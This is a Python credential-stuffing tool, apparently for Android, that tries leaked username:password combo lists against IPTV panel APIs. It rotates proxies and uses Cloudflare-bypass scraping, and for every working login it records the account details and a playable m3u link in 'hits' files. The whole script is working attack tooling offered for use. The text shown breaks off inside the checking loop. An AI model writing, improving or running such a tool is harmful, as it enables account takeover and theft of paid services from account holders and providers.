import os,pip
try:
	import requests
except:
	print("requests modulu yüklü değil \n requests modulü yükleniyor \n")
	pip.main(['install', 'requests'])
	import requests

import random, time, datetime
import subprocess
import json,sys,re,base64
import pathlib
import threading
#import shutil
###################################################
hits='/sdcard/Hits/𝔸ℝ𝔼𝔸𝟝𝟙-𝕄𝟛𝕌'
import os
if not os.path.exists(hits):
    os.mkdir(hits)
##################################################

import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)
mac = ""#str(get_mac())
if not os.path.exists('/sdcard/Hits/𝔸ℝ𝔼𝔸𝟝𝟙-𝕄𝟛𝕌/ℂ𝕆𝕄𝔹𝕆-𝔸ℝ𝔼𝔸𝟝𝟙'):
    os.makedirs('/sdcard/hits/𝔸ℝ𝔼𝔸𝟝𝟙-𝕄𝟛𝕌/ℂ𝕆𝕄𝔹𝕆-𝔸ℝ𝔼𝔸𝟝𝟙')
    
if not os.path.exists('/sdcard/Proxies'):
    os.makedirs('/sdcard/Proxies')

if not os.path.exists('/sdcard/sound'):
    os.makedirs('/sdcard/sound')

try:
	import cfscrape
	sesq= requests.Session()
	ses = cfscrape.create_scraper(sess=sesq)
except:
	ses= requests.Session()

try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass

pattern= "(^\S{2,}:\S{2,}$)|(^.*?(\n|$))"
#subprocess.run(["clear", ""])
say=0
hit=0
bul=0
cpm=1
Maxkakashi=""

print(Maxkakashi)
def a(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)
a("""     
  \033[32m █▀▀█ █▀▀█ █▀▀▀ █▀▀█   █▀▀ ▄█░              \33[0m
  \033[32m █▄▄█ █▄▄▀ █▀▀▀ █▄▄█   ▀▀▄ ░█░              \33[0m
  \033[32m █░▒█ █░▒█ █▄▄▄ █░▒█   ▄▄▀ ▄█▄              \33[0m
 
     \033[32m⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣶⣶⣶⣶⣶⣶⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀\33[0m
     \033[32m⠀⠀⠀⠀⠀⣀⣴⣾⡿⠟⠛⠋⠉⠉⠀⠈⠉⠉⠉⠛⠻⢿⣷⣦⣀⠀⠀⠀⠀⠀\33[0m
     \033[32m⠀⠀⠀⢠⣾⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣷⣄⠀⠀⠀              \33[0m
     \033[32m⠀⠀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣦⠀⠀               \33[0m
     \033[32m⠀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣧⠀               \33[0m
     \033[32m⢸⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡇               \33[0m
     \033[32m⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹               \33[0m
     \033[32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀               \33[0m
     \033[32m⠀⢤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⠀               \33[0m
     \033[32m⠀⢸⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⠀               \33[0m
     \033[32m⠀⢸⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⡇               ⠀\33[0m
     \033[32m⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀               \33[0m
     \033[32m⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀               ⠀\33[0m
     \033[32m⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀               \33[0m
     \033[32m⠀⠠⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⡄⠀⠀⢀⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⡄⠀               \33[0m
     \033[32m⠀⠀⢣⡀⠀⠀⠀⠉⠙⠻⠿⠿⢿⠇⠀⠀⠘⡿⠿⠿⠟⠋⠉⠀⠀⠀⢀⡼⠀⠀         \33[0m
     \033[32m⠀⠀⠈⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⠀⠀         \33[0m
     \033[32m⠀⠀⠀⠀⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠟⠀⠀⠀⠀\33[0m
     \033[32m⠀⠀⠀⠀⠀⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀\33[0m
     \033[32m⠀⠀⠀⠀⠀⠀⠀⠙⢷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡾⠋⠀⠀⠀⠀⠀⠀⠀\33[0m
     \033[32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣶⣤⡀⠀⠀⢀⣤⣶⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀\33[0m
     \033[32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⡿⠟⠋⠀⠀⠀⠀                    \33[0m
""")

time.sleep(1)
nick=str(input("\33[1;37;92m 𝕀ℕ𝔾ℝ𝔼𝕊𝔼 𝕊𝕌 ℕ𝕀ℂ𝕂 ➪ \33[0m "))


say=0
dsy=""
dir='/sdcard/combo/'
for files in os.listdir (dir):
	#if files.endswith(".txt"):
	say=say+1
	dsy=dsy+"╠🛸  \033[1;91m\33[0m\033[36m"+str(say)+" \33[0m \033[32m"+files+'\33[0m\n'
print ("""
\33[1;33m        𝔼𝕃𝕀𝔾𝔼 𝕌ℕ ℂ𝕆𝕄𝔹𝕆!\33[0m
	
╔════════════════════	
"""+dsy+"""╚════════════════════
 
\33[1;33m     𝔼ɴᴄᴏɴᴛʀᴀᴅᴏ𝕤 """ +str(say)+""" ℂᴏᴍʙᴏ𝕤! 𝔼𝕝𝕚𝕘𝕖 𝕦𝕟𝕠...\33[0m\33[1;31m
""")

dsyno=str(input("\33[1;31mℂᴏᴍʙᴏ ℕ∘:\33[0m\33[0m"))
say=0
for files in os.listdir (dir):
	#if files.endswith(".txt"):
	say=say+1
	if dsyno==str(say):
		dosyaa=(dir+files)
		break
say=0
	



#subprocess.run(["clear", ""])
print("\n")
print(dosyaa) 
botsay=input("""
   \33[92m           𝔼𝕤ᴘᴇᴄıꜰıǫᴜᴇ  ℕᴜ́ᴍᴇʀᴏ ᴅᴇ 𝔹ᴏᴛ𝕤\33[0m
\33[92m        𝔼ɴᴛʀᴇ ᴅᴇ 𝟙 ᴀ 𝟝𝟘, 𝔻ᴇꜰıɴᴀ ᴜ𝕟 ℕᴜ́ᴍᴇʀᴏ
      
\33[1;33mℕ∘ ᴅᴇ 𝔹ᴏᴛ𝕤:\33[0m""" )
botsay=int(botsay)		
Pro= input('\33[32m[+]\33[0m\33[1;95m ℚᴜ𝕚𝕖𝕣𝕖𝕤 ᴜ𝕤ᴀʀ ℙʀᴏ𝕩ɪᴇ𝕤? \33[0m (\33[1;91mY/N\33[0m): ')

Pro= Pro.lower()

print('  ')
print("\033[H\033[J", end="")
print(Maxkakashi)

ppp=""

if Pro == "y":
	say=0
	dsy=""
	dir='/sdcard/proxies/'
	file=len(Maxkakashi)
	for files in os.listdir (dir):
			say=say+1
			dsy=dsy+"╠🛸  \033[1;91m\33[0m\033[36m"+str(say)+" \33[0m \033[32m"+files+'\33[0m\n'
	print ("""\33[1;33m𝔼𝕝𝕚𝕘𝕖 ℙʀᴏ𝕩ʏ  𝔻𝕖 𝕃ı𝕤ᴛᴀ 𝔸ʙᴀı𝕛ᴏ!\33[0m!!!
╔════════════════════
"""+dsy+"""╚════════════════════

\33[1;33m𝔽ᴏʀᴀᴍ 𝔼ɴᴄᴏɴᴛʀᴀᴅᴏ𝕤 """ +str(say)+""" ℙʀᴏ𝕩ʏ𝕤! 𝔼𝕝𝕚𝕘𝕖 ᴜ𝕟𝕠...\33[0m\33[1;31m
	
	""")
	
	proxy_txt=str(input(" \33[1;31mℙʀᴏ𝕩ʏ ℕ∘\33[0m\33[0m"))
	
	say=0
	
	for files in os.listdir (dir):	 	
	
			say=say+1
	
			if proxy_txt==str(say):	 	     		 	   	
	
					proxy_list=(dir+files)
	
					break
	
	say=0
	
	file = pathlib.Path(proxy_list)
	
	if file.exists (): 	    	 	  	
	
			print ("Aʀǫᴜɪᴠᴏ Eɴᴄᴏɴᴛʀᴀᴅᴏ")
	
	else:
	
			print("\33[31mAʀǫᴜɪᴠᴏ ɴᴀᴏ Eɴᴄᴏɴᴛʀᴀᴅᴏ..! \33[0m") 
	
			ppp="ninguno"
	
	
	
			if ppp=="ninguno" :
	
					exit()
	print("\033[H\033[J", end="")
	print(Maxkakashi) 
	
	print('  ')
	
	proxy_txt=(proxy_list)
	
	proxy_len = len(open(proxy_txt, 'r', errors='ignore').read().split('\n'))
	
	proxy_type = input("""
  \033[32m █▀▀█ █▀▀█ █▀▀▀ █▀▀█   █▀▀ ▄█░              \33[0m
  \033[32m █▄▄█ █▄▄▀ █▀▀▀ █▄▄█   ▀▀▄ ░█░              \33[0m
  \033[32m █░▒█ █░▒█ █▄▄▄ █░▒█   ▄▄▀ ▄█▄              \33[0m
            \033[32m █▀▄▀█ █▀▀█ █░▒█            \33[0m
            \033[32m █▒█▒█ ░░▀▄ █░▒█            \33[0m
             \033[32m█░░▒█ █▄▄█ ▀▄▄▀            \33[0m
             
\33[1;31m𝔼𝕤ᴄᴏʟʜᴀ ᴏ 𝕋ɪᴘᴏ ᴅᴇ ℙʀᴏ𝕩ʏ ɴᴀ 𝕃ɪ𝕤ᴛᴀ 𝔸ʙᴀɪ𝕩ᴏ\33[0m

 H\033[1;91m➪ \33[0m \033[32mℍ𝕋𝕋ℙ   \33[0m
 4\033[1;91m➪ \33[0m \033[32m𝕊𝕆ℂ𝕂𝕊 𝟜  \33[0m
 5\033[1;91m➪ \33[0m \033[32m𝕊𝕆ℂ𝕂𝕊 𝟝  \33[0m

\033[36m𝕀ɴ𝕤ɪʀᴀ ᴏ 𝕋ɪᴘᴏ ᴅᴇ ℙʀᴏ𝕩ʏ \33[0m = """)


	
	proxy_type=proxy_type.lower()
	
	print('  ')
	
	print(str(proxy_len)+"\33[1;31m 𝕋ᴏᴛᴀʟ ᴅᴇ ℙʀᴏ𝕩ɪᴇ𝕤 ᴇ𝕟 𝔸ʀ𝕔𝕙𝕚𝕧𝕠 \33[0m\033[36m "+str(proxy_txt))
	
	time.sleep(2)

class Proxies:

	def init(self):
		self.proxies = []

	def load_proxies(self, proxy_txt,):
		with open(proxy_txt, 'r', errors='ignore') as (f):
			self.proxies = f.read().split('\n')

	def random_proxy(self, proxy_type):        
		
		self.load_proxies(proxy_txt)
		
		proxy = random.choice(self.proxies)
		
		proxy=proxy.replace("\000", "")
		
		proxy=proxy.replace("<br />", "")
		
		proxy=proxy.replace("<br/>", "")
		
		proxy_type = proxy_type.lower()
		
		if proxy_type == 'h':
		
			return {'http':proxy,  'https':proxy}
		
		if proxy_type == '4':
		
			return {'https': 'socks4://' + proxy}
		
		if proxy_type == '5':
		
			return {'https': 'socks5://' + proxy}
		
		return {'https': proxy}         



if Pro=="y":

	ses.proxies = Proxies().random_proxy(proxy_type)		 		
print(Maxkakashi)


def kategori(katelink):
	try:
		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(katelink,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

		else:
		
							res = ses.get(katelink,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"
		veri=""
		kate=""
		veri=str(res.text)
		for i in veri.split('category_name":"'):
			kate=kate+" «🛸» "+str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
	except:pass
	#print(kate)
	return kate
HEADERd={
"Cookie": "stb_lang=en; timezone=Europe%2FIstanbul;",
"X-User-Agent":"Model: MAG322; Link: Ethernet",
"Accept": "*/*",
"Connection": "Keep-Alive",
"Accept-Encoding": "gzip",
"User-Agent": "okhttp/4.7.1",
            } 		
     							
dsy=dosyaa#"fastX_m3uTara" +combo+'.txt'
combo=dsy
dosya=""
file = pathlib.Path(dsy)
if file.exists ():
     print ("Aʀǫᴜɪᴠᴏ Eɴᴄᴏɴᴛʀᴀᴅᴏ")
else:
    print("\33[31mAʀǫᴜɪᴠᴏ ɴᴀᴏ Eɴᴄᴏɴᴛʀᴀᴅᴏ..! \33[0m") 
    dosya="Nᴇɴʜᴜᴍ"
#print(len(Maxkakashi)) 
if dosya=="Nᴇɴʜᴜᴍ" :
    exit() 

    
c=open(dsy, 'r')
totLen=c.readlines()
uz=(len(totLen))
	
	                        
#subprocess.run(["clear", ""])
print(Maxkakashi) 


#print(dosya)
print("\33[1;37;92m𝔸ʀǫᴜɪᴠᴏ 𝔹ᴏᴛ  \033[32m:\33[1;96m"+str(botsay))


#Panel ve Portu yazın (portaliptv.com:8080)
#print(Maxkakashi) 
#dir="FastX_m3u"
print("""
\33[1;37;92m𝔸ʀǫᴜɪᴠᴏ 𝕊ᴇʟᴇᴄɪᴏɴᴀᴅᴏ \033[32m: \33[1;96m """ + dsy) 
#################
panel = input("""
  \033[32m █▀▀█ █▀▀█ █▀▀▀ █▀▀█   █▀▀ ▄█░              \33[0m
  \033[32m █▄▄█ █▄▄▀ █▀▀▀ █▄▄█   ▀▀▄ ░█░              \33[0m
  \033[32m █░▒█ █░▒█ █▄▄▄ █░▒█   ▄▄▀ ▄█▄              \33[0m
            \033[32m █▀▄▀█ █▀▀█ █░▒█            \33[0m
            \033[32m █▒█▒█ ░░▀▄ █░▒█            \33[0m
             \033[32m█░░▒█ █▄▄█ ▀▄▄▀            \33[0m
             
\33[1;93mℂᴏʟᴏǫᴜᴇ ᴜ𝕟 𝕊ᴇʀᴠɪᴅᴏʀ ᴘᴀʀᴀ 𝔼𝕤ᴄᴀɴᴇᴀʀ\33[0m\n\n
\33[1;37;92mℙᴀɪɴᴇʟ: ℙᴏʀᴛᴀ ➪ \33[0m \033[32m""")
#=======+++=++++++====++=======
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
portal=panel
fx=portal.replace(':','_')
dosyaa=dosyaa.replace('/sdcard/combo/',"")
dosyaa=dosyaa.replace('.txt',"")
dosy=dosyaa
dosyaaa=dosy.replace('/',"")
kanall=""
kanall=input("""
  \033[32m █▀▀█ █▀▀█ █▀▀▀ █▀▀█   █▀▀ ▄█░              \33[0m
  \033[32m █▄▄█ █▄▄▀ █▀▀▀ █▄▄█   ▀▀▄ ░█░              \33[0m
  \033[32m █░▒█ █░▒█ █▄▄▄ █░▒█   ▄▄▀ ▄█▄              \33[0m
            \033[32m █▀▄▀█ █▀▀█ █░▒█            \33[0m
            \033[32m █▒█▒█ ░░▀▄ █░▒█            \33[0m
             \033[32m█░░▒█ █▄▄█ ▀▄▄▀            \33[0m
             
\33[92m 𝕀ɴᴄʟᴜɪʀ 𝕃ɪ𝕤ᴛᴀ ᴅᴇ ℂᴀᴛᴇɢᴏʀɪᴀ𝕤 ᴅᴇ ℂᴀɴᴀʟ \033[32m?
 1\033[1;91m➪  \033[32m \033[32m𝕊𝕚  \033[32m
 2\033[1;91m➪ ​​ \033[32m \033[32mℕ𝕠   \033[32m
 ℝᴇ𝕤ᴘ𝕦𝔼𝕤ᴛᴀ=""")
if not kanall=="1":
	kanall=2
#subprocess.run(["clear", ""])
print(Maxkakashi) 
					
def kategori(katelink):
	try:
		res = ses.get(katelink,headers=HEADERd, timeout=15, verify=False)
		veri=""
		kate=""
		veri=str(res.text)
		for i in veri.split('category_name":"'):
			kate=kate+" "+str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
	except:pass
	#print(kate)
	return kate


def onay(veri,user,pas):
		status=veri.split('status":')[1]
		status=status.split(',')[0]
		status=status.replace('"',"")
		katelink="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_categories"
		
		sound="/sdcard/Sound/Tiro.mp3"
		file = pathlib.Path(sound)
		try:
		   if file.exists ():
		      ad.mediaPlay(sound)
		except:pass
		
		
		
		acon=""
		acon=veri.split('active_cons":')[1]
		acon=acon.split(',')[0]
		acon=acon.replace('"',"")
		mcon=veri.split('max_connections":')[1]
		mcon=mcon.split(',')[0]
		mcon=mcon.replace('"',"")
		timezone=veri.split('timezone":"')[1]
		timezone=timezone.split('",')[0]
		timezone=timezone.replace("\/","/")
		
		realm=veri.split('url":')[1]
		realm=realm.split(',')[0]
		realm=realm.replace('"',"")
		port=veri.split('port":')[1]
		port=port.split(',')[0]
		port=port.replace('"',"")
		user=veri.split('username":')[1]
		user=user.split(',')[0]
		user=user.replace('"',"")
		passw=veri.split('password":')[1]
		passw=passw.split(',')[0]
		passw=passw.replace('"',"")
		bitis=veri.split('exp_date":')[1]
		bitis=bitis.split(',')[0]
		bitis=bitis.replace('"',"")
		if bitis=="null":
			   bitis="Unlimited"
		else:
			   bitis=(datetime.datetime.fromtimestamp(int(bitis)).strftime('%Y-%m-%d %H:%M:%S'))
		bitis=bitis
		
		if kanall=="1":
			try:
				kategori=""
				if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(katelink,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

				else:
							res = ses.get(katelink,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"
				veri=""
				kate=""
				veri=str(res.text)
				for i in veri.split('category_name":"'):
					kate=kate+" «🛸» "+str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
				kategori=kate
			except:pass
		#print(kategori)
		
		url5="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
		try:
			if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(url5,timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			else:
							res = ses.get(url5,timeout=1, verify=False)
							proxy_="No"
			veri=str(res.text)
			kanalsayisi=""
			#if  'stream_id' in veri:
			kanalsayisi=str(veri.count("stream_id"))
			
			url5="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
			if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(url5,timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			else:
							res = ses.get(url5,timeout=1, verify=False)
							proxy_="No"
			
			veri=str(res.text)
			filmsayisi=str(veri.count("stream_id"))
			
			url5="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
			if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(url5,timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			else:
							res = ses.get(url5,timeout=1, verify=False)
							proxy_="No"
			veri=str(res.text)
			dizisayisi=str(veri.count("series_id"))
			 
		except:pass
		
		m3ulink="http://"+ panel + "/get.php?username=" + user + "&password=" + pas + "&type=m3u_plus"
		salvacombo(user+':'+pas+'\n') 
		salvacomboall(user+':'+pas+'\n')
		
		sayi=""
		mt=("""
╔═🛸 🅼③🅄🛸
╠🛸ℍɪᴛ𝕤 𝔹𝕪➪ """+str(nick)+"""
╠🛸𝔻ᴀᴛᴀ  𝕊𝕔ᴀɴ➪ """+str(time.strftime('%d-%m-%Y'))+"""
╠🛸ℍᴏ𝕤ᴛ➪ http://"""+portal+"""
╠🛸ℝᴇᴀʟ➪ http://"""+realm+"""
╠🛸ℙᴏʀᴛᴀ➪ """+port+"""
╠🛸𝔼𝕩ᴘɪʀᴀ➪ """+bitis+"""
╠🛸𝕌𝕤ᴜ́ᴀʀɪᴏ➪ """+user+"""
╠🛸𝕊ᴇɴʜᴀ➪ """+pas+"""
╠🛸ℂᴏɴᴛᴀ𝕤 𝔸ᴛɪᴠᴀ𝕤➪ """+acon+"""
╠🛸ℂᴏɴᴛᴀ𝕤 𝕄ᴀ́𝕩ɪᴍᴀ𝕤➪ """+mcon+""" 
╠🛸𝕊ᴛᴀᴛᴜ𝕤➪ """+status+"""
╠🛸ℂʀɪᴀᴅᴏʀ➪ kαkαsнı нαтαkє
╠🛸ℤ𝕠𝕟𝕒➪ """+timezone+""" 
╠═🛸🅼🄴🄳🄸🄰🅻🄸🅂🅃🛸 """)		
		if not kanalsayisi =="":
			sayi=("""
╠🛸ℂᴀɴᴀɪ𝕤➪ """+kanalsayisi+"""
╠🛸 𝔽ɪʟᴍᴇ𝕤➪ """+filmsayisi+"""
╠🛸 𝕊𝕖𝕣𝕚𝕖𝕤 ➪ """+dizisayisi+""" """)
		imzak=""
		if kanall=="1":
			imzak="""
╠🛸 """+str(kategori)+"""

"""
		mtl=("""
╠🛸𝕄ɜᴜ 𝕃ɪɴᴋ➪ """+m3ulink+""" """) 
			
			
		yaz(mt+sayi+mtl+imzak+'\n')
		print(mt+sayi+mtl+imzak)
                       
		
		#print(str(kategori))
		
def yaz(kullanici): 
    dosya=open('/sdcard/Hits/𝔸ℝ𝔼𝔸𝟝𝟙-𝕄𝟛𝕌/'+'𝔸ℝ𝔼𝔸𝟝𝟙-𝕄𝟛𝕌@'+fx+'.txt','a+') 
    dosya.write(kullanici) 
    dosya.close() 
def salvacombo(arquivo): 
    archivo=open('/sdcard/Hits/𝔸ℝ𝔼𝔸𝟝𝟙-𝕄𝟛𝕌/ℂ𝕆𝕄𝔹𝕆-𝔸ℝ𝔼𝔸𝟝𝟙/ℂ𝕆𝕄𝔹𝕆-𝔸ℝ𝔼𝔸𝟝𝟙-'+fx+'.txt','a+') 
    archivo.write(arquivo) 
    archivo.close()
def salvacomboall(arquivo): 
    archivo=open('/sdcard/Hits/𝔸ℝ𝔼𝔸𝟝𝟙-𝕄𝟛𝕌/ℂ𝕆𝕄𝔹𝕆-𝔸ℝ𝔼𝔸𝟝𝟙/ℂ𝕆𝕄𝔹𝕆-𝔸ℝ𝔼𝔸𝟝𝟙-𝔾𝔼ℝ𝔸𝕃.txt','a+') 
    archivo.write(arquivo) 
    archivo.close()




cpm=0
proxy_="\33[1;33m"
def echox(user,pas,bot,fyz,oran,hit,proxy_):
	global cpm
	
	cpmx=(time.time()-cpm)
	cpmx=(round(60/cpmx))
	#cpm=cpmx
	if str(cpmx)=="0":
		cpm=cpm
	else:
		cpm=cpmx
	if Pro == 'y':
		echo=("""
\033[32m █▀▀█ █▀▀█ █▀▀▀ █▀▀█   █▀▀ ▄█░             \33[0m
\033[32m █▄▄█ █▄▄▀ █▀▀▀ █▄▄█   ▀▀▄ ░█░             \33[0m
\033[32m █░▒█ █░▒█ █▄▄▄ █░▒█   ▄▄▀ ▄█▄             \33[0m
	
	
╠🛸  \33[93m𝕊𝕔𝕒𝕟 𝔻𝕒𝕥𝕖 ➪ """+str(time.strftime('%d-%m-%Y'))+"""  \33[0m
╠🛸  \33[1;92m𝕊𝕖𝕣𝕧𝕚𝕕𝕠𝕣➪ \33[0m\33[1;37;92m"""+portal+""" \33[0m   
╠🛸  \33[1;37m𝕌𝕤𝕦𝕒𝕣𝕚𝕠 ➪ \33[0m """+user+""" \33[0m
╠🛸  \33[1;37mℙ𝕒𝕤𝕤 ➪ \33[0m """+pas+""" \33[0m
╠🛸  \33[1m𝔹𝕠𝕥 ➪ """+str(bot)+"""  \33[0m
╠🛸  \33[1;31mℂ𝕒𝕣𝕣𝕖𝕘𝕒𝕕𝕠 ➪ %"""+str(oran)+"""  \33[0m
╠🛸  \33[1;94mℂ𝕡𝕞 ➪  """+str(cpm)+"""    \33[0m
╠🛸  \33[1;93m▄︻デ𝔸𝕣𝕖𝕒𝟝𝟙🛸  ℍ𝕚𝕥═ᕗ ┉ ⚞"""+str(hit)+"""⚟    \33[0m
╠🛸  \33[1;36m𝕋𝕠𝕥𝕒𝕝 ➪  """ + str(fyz)+""" / """+str(uz)+"""  \33[0m
╠🛸  \33[1;95mℂ𝕠𝕞𝕓𝕠 ➪\33[0m\33[1;95m"""+dosyaaa+"""  \33[0m
╠🛸  \33[1mℙ𝕣𝕠𝕩𝕪 ➪ \33[0m\33[1;96m """+proxy_+"""  \33[0m    
╠🛸  \033[32mℍ𝕚𝕥𝕤 𝔹𝕪➪"""+str(nick)+"""   \33[0m   """)

	else:
		echo=("""
\033[32m █▀▀█ █▀▀█ █▀▀▀ █▀▀█   █▀▀ ▄█░             \33[0m
\033[32m █▄▄█ █▄▄▀ █▀▀▀ █▄▄█   ▀▀▄ ░█░             \33[0m
\033[32m █░▒█ █░▒█ █▄▄▄ █░▒█   ▄▄▀ ▄█▄             \33[0m
	
	
╠🛸  \33[93m𝕊𝕔𝕒𝕟 𝔻𝕒𝕥𝕖 ➪ """+str(time.strftime('%d-%m-%Y'))+"""  \33[0m
╠🛸  \33[1;92m𝕊𝕖𝕣𝕧𝕚𝕕𝕠𝕣➪ \33[0m\33[1;37;92m"""+portal+""" \33[0m   
╠🛸  \33[1;37m𝕌𝕤𝕦𝕒𝕣𝕚𝕠 ➪  \33[0m """+user+""" \33[0m
╠🛸  \33[1;37mℙ𝕒𝕤𝕤 ➪  \33[0m """+pas+""" \33[0m
╠🛸  \33[1m𝔹𝕠𝕥 ➪ """+str(bot)+"""  \33[0m
╠🛸  \33[1;31mℂ𝕒𝕣𝕣𝕖𝕘𝕒𝕕𝕠 ➪ %"""+str(oran)+"""  \33[0m
╠🛸  \33[1;94mℂ𝕡𝕞 ➪  """+str(cpm)+"""    \33[0m
╠🛸  \33[1;93m▄︻デ𝔸𝕣𝕖𝕒𝟝𝟙🛸  ℍ𝕚𝕥═ᕗ ┉ ⚞"""+str(hit)+"""⚟    \33[0m
╠🛸  \33[1;36m𝕋𝕠𝕥𝕒𝕝 ➪  """ + str(fyz)+""" / """+str(uz)+"""  \33[0m
╠🛸  \33[1;95mℂ𝕠𝕞𝕓𝕠 ➪\33[0m\33[1;95m"""+dosyaaa+"""  \33[0m
╠🛸  \033[32mℍ𝕚𝕥𝕤 𝔹𝕪➪"""+str(nick)+"""   \33[0m  """)

	print(echo)
	cpm=time.time()
	
	
hit=0	
def d1():
	global hit
	global proxy_
	say=0
	for fyz in range(1,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='02'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

			 				PP = Proxies().random_proxy(proxy_type)
			 	
			 				res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)
			 	
			 				proxy_=str(PP)
			 	
			 		else:
			 				res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
			 				proxy_="No"

			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
